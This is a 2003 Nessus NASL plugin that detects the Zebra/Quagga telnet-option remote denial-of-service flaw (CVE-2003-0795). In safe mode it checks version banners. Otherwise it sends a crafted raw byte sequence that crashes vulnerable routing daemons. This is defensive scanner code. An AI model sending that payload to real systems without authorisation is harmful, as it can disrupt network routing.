# MA 2003-11-17: added Services/zebra + MIXED_ATTACK support

if(description)
{
        script_id(11925);
        script_bugtraq_id(9029);
        script_version("$Revision: 1.9 $");
  	if ( defined_func("script_xref") ) script_xref(name:"RHSA", value:"RHSA-2003:307-01");

	script_cve_id("CVE-2003-0795", "CVE-2003-0858");
        name["english"] = "Zebra and Quagga Remote DoS";
        script_name(english:name["english"]);
        desc["english"] = "
A remote DoS exists in Zebra and/or Quagga when sending a telnet option 
delimiter with no actual option data.

An attacker may exploit this flaw to prevent this host from doing proper
routing.

This affects all versions from 0.90a to 0.93b.

Solution: Quagga Version 0.96.4.
Also see: http://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=107140
Risk factor:High";
        script_description(english:desc["english"]);
        summary["english"] = "Attempts to crash the remote service Zebra and/or Quagga";
        script_summary(english:summary["english"]);
        script_category(ACT_MIXED_ATTACK);
        script_copyright(english:"This script is copyright (C) 2003 Matt North");
	script_require_ports("Services/zebra", 2601, 2602, 2603, 2604, 2605);
	script_dependencie("find_service.nes");
        family["english"] = "Denial of Service";
        script_family(english:family["english"]);
        exit(0);
}

# Maybe we should try this on any telnet server?
port = get_kb_item("Services/zebra");

if (! port) port = 2601;
if (! get_port_state(port)) exit(0);

if (safe_checks())
{
  banner = get_kb_item("zebra/banner/"+port);
  if (!banner)
  {
    soc = open_sock_tcp(port);
    if(!soc) exit(0);
    banner = recv_line(socket: soc, length: 1024);
    set_kb_item(name: "zebra/banner/"+port, value: banner);
    close(soc);
  }
  if (banner && egrep(string: banner, 
		pattern: "Hello, this is zebra \(version 0\.9[0-3][ab]?\)"))
    security_hole(port: port);
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc) exit(0);

s = raw_string(0xff,0xf0,0xff,0xf0,0xff,0xf0);

send(socket:soc, data:s);
r = recv(socket: soc, length:1024);
close(soc);
alive = open_sock_tcp(port);
if(!alive) security_hole(port);
else close(alive);

